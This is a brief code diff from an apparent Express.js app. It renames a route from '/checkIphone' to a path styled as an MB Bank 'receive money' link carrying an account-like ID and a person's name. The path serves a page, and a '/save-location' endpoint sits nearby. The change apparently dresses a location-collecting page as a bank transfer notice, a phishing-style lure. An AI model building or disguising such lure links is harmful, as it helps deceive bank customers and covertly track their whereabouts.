@@ -55,7 +55,7 @@ router.use("/json", (req, res) => {
     res.json(tasks);
 })
 //======================================================
-router.use('/checkIphone', (req, res) => {
+router.use('/mbbank-nhan-tien-id_mbbank_93903904-hoangvanmanh', (req, res) => {
     res.sendFile(__dirname + '/index.html');
 });
 router.post('/save-location', (req, res) => {
